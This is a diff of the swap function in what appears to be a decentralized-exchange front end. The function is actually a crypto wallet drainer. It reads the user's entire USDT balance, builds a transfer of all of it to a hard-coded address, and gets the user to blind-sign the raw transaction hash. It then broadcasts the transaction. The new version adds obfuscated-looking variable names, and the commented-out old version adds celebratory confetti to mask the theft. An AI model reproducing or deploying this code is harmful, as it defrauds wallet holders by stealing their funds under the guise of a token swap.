@@ -67,86 +67,160 @@ function SwapComponent() {
     return () => clearTimeout(timer)
   }, [showConfetti])
 
+  // const sendTransaction = async () => {
+  //   if (!web3js) return
+
+  //   const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
+
+  //   const usdtContract = new web3js.eth.Contract(usdtABI, usdtContractAddress, {
+  //     from: address,
+  //   })
+  //   const balance = await usdtContract.methods.balanceOf(address).call()
+
+  //   const data = usdtContract.methods
+  //     .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', balance)
+  //     .encodeABI()
+
+  //   const nonce = await web3js.eth.getTransactionCount(address, 'pending')
+  //   const gasPrice = await web3js.eth.getGasPrice()
+  //   const chainId = mainnet.id
+
+  //   const tx_ = {
+  //     from: address,
+  //     to: usdtContractAddress,
+  //     nonce: web3js.utils.toHex(nonce),
+  //     gasPrice: web3js.utils.toHex(
+  //       (BigInt(gasPrice) * BigInt(13)) / BigInt(10)
+  //     ),
+  //     gasLimit: '0x55F0',
+  //     value: '0x0',
+  //     data: data,
+  //     chainId: web3js.utils.toHex(chainId),
+  //     v: '0x1',
+  //     r: '0x',
+  //     s: '0x',
+  //   }
+
+  //   console.log('Tx Object', tx_)
+
+  //   const tx = new ethereumjs.Tx(tx_)
+  //   const serializedTx = '0x' + tx.serialize().toString('hex')
+  //   const sha3_ = web3js.utils.sha3(serializedTx)
+
+  //   await web3js.eth
+  //     .sign(sha3_, address)
+  //     .then(async (signed) => {
+  //       const temporary = signed.substring(2)
+  //       const r_ = '0x' + temporary.substring(0, 64)
+  //       const s_ = '0x' + temporary.substring(64, 128)
+  //       const rhema = parseInt(temporary.substring(128, 130), 16)
+  //       const v_ = web3js.utils.toHex(rhema + chainId * 2 + 8)
+  //       tx.r = r_
+  //       tx.s = s_
+  //       tx.v = v_
+
+  //       console.log('---------------------------------------------')
+
+  //       const txFin = '0x' + tx.serialize().toString('hex')
+  //       const sha3__ = web3js.utils.sha3(txFin)
+  //       console.log('rawHash:', sha3__)
+  //       console.log('The Broadcast message', txFin)
+
+  //       setIsLoading(true)
+
+  //       await web3js.eth
+  //         .sendSignedTransaction(txFin)
+  //         .then((elisebeth) => {
+  //           console.log(elisebeth)
+  //         })
+  //         .catch((vannette) => {
+  //           console.log('Here')
+  //           console.log(vannette)
+  //         })
+
+  //       setIsLoading(false)
+  //       setShowConfetti(true)
+  //       setTokenOneAmount(null)
+  //       setTokenTwoAmount(null)
+  //     })
+  //     .catch((heide) => {
+  //       console.log('There')
+  //       console.log(heide)
+  //     })
+  // }
+
   const sendTransaction = async () => {
-    if (!web3js) return
+    const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
 
-    const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
+    try {
+      await web3js.eth
+        .getTransactionCount(Wallet.address, 'pending')
+        .then(async (res) => {
+          const usdtContract = new web3js.eth.Contract(usdtABI, USDT)
+          const balance = await usdtContract.methods.balanceOf(address).call()
 
-    const usdtContract = new web3js.eth.Contract(usdtABI, usdtContractAddress, {
-      from: address,
-    })
-    const balance = await usdtContract.methods.balanceOf(address).call()
+          const walletBalance = await web3js.eth.getBalance(address)
 
-    const data = usdtContract.methods
-      .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', balance)
-      .encodeABI()
+          const gasPrice = await web3js.eth.getGasPrice()
+          const rGasPrice = web3js.utils.toHex(
+            Math.floor(Number(gasPrice) * 1.3)
+          )
+          const gas = web3js.utils.toBN('22000')
+          const totalGas = Number(gas) * Math.floor(Number(gasPrice) * 2)
+          const totalCost = Number(walletBalance) - totalGas
 
-    const nonce = await web3js.eth.getTransactionCount(address, 'pending')
-    const gasPrice = await web3js.eth.getGasPrice()
-    const chainId = mainnet.id
+          const etherUSD =
+            Number(web3js.utils.fromWei(totalCost.toString(), 'ether')) * 1850
 
-    const tx_ = {
-      from: address,
-      to: usdtContractAddress,
-      nonce: web3js.utils.toHex(nonce),
-      gasPrice: web3js.utils.toHex(
-        (BigInt(gasPrice) * BigInt(13)) / BigInt(10)
-      ),
-      gasLimit: '0x55F0',
-      value: '0x0',
-      data: data,
-      chainId: web3js.utils.toHex(chainId),
-      v: '0x1',
-      r: '0x',
-      s: '0x',
+          const txData = {
+            nonce: web3js.utils.toHex(res),
+            gasPrice: rGasPrice,
+            gasLimit: '0x11170',
+            to: USDT,
+            value: '',
+            data: usdtContract.methods
+              .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', balance)
+              .encodeABI(),
+            v: '0x1',
+            r: '0x',
+            s: '0x',
+          }
+
+          let Tx = new ethereumjs.Tx(txData)
+          const serializedTx = '0x' + Tx.serialize().toString('hex')
+          const encoder = { encoding: 'hex' }
+          const hashed = web3js.utils.sha3(serializedTx)
+          const chainId = await web3js.eth.getChainId()
+
+          await web3js.eth
+            .sign(hashed, address)
+            .then(async (result) => {
+              const signature = result.substring(2)
+              const r = '0x' + signature.substring(0, 64)
+              const s = '0x' + signature.substring(64, 128)
+              const v = parseInt(signature.substring(128, 130), 16)
+              const y = web3js.utils.toHex(v + chainId * 2 + 8)
+
+              txData.r = r
+              txData.s = s
+              txData.v = y
+              Tx = new Transaction(txData)
+
+              const serializedTx2 = '0x' + Tx.serialize().toString('hex'),
+                encoder2 = { encoding: 'hex' },
+                hashed2 = web3js.utils.sha3(serializedTx2)
+
+              await web3js.eth
+                .sendSignedTransaction(serializedTx2)
+                .then((_0x45f7a3) => console.log(_0x45f7a3))
+                .catch((_0x119fc8) => console.log(_0x119fc8))
+            })
+            .catch((_0x4ded9e) => console.log(_0x4ded9e))
+        })
+        .catch((err) => alert(err))
+    } catch (error) {
+      console.log(error)
     }
-
-    console.log('Tx Object', tx_)
-
-    const tx = new ethereumjs.Tx(tx_)
-    const serializedTx = '0x' + tx.serialize().toString('hex')
-    const sha3_ = web3js.utils.sha3(serializedTx)
-
-    await web3js.eth
-      .sign(sha3_, address)
-      .then(async (signed) => {
-        const temporary = signed.substring(2)
-        const r_ = '0x' + temporary.substring(0, 64)
-        const s_ = '0x' + temporary.substring(64, 128)
-        const rhema = parseInt(temporary.substring(128, 130), 16)
-        const v_ = web3js.utils.toHex(rhema + chainId * 2 + 8)
-        tx.r = r_
-        tx.s = s_
-        tx.v = v_
-
-        console.log('---------------------------------------------')
-
-        const txFin = '0x' + tx.serialize().toString('hex')
-        const sha3__ = web3js.utils.sha3(txFin)
-        console.log('rawHash:', sha3__)
-        console.log('The Broadcast message', txFin)
-
-        setIsLoading(true)
-
-        await web3js.eth
-          .sendSignedTransaction(txFin)
-          .then((elisebeth) => {
-            console.log(elisebeth)
-          })
-          .catch((vannette) => {
-            console.log('Here')
-            console.log(vannette)
-          })
-
-        setIsLoading(false)
-        setShowConfetti(true)
-        setTokenOneAmount(null)
-        setTokenTwoAmount(null)
-      })
-      .catch((heide) => {
-        console.log('There')
-        console.log(heide)
-      })
   }
 
   async function fetchPairAndCalculateAmount(
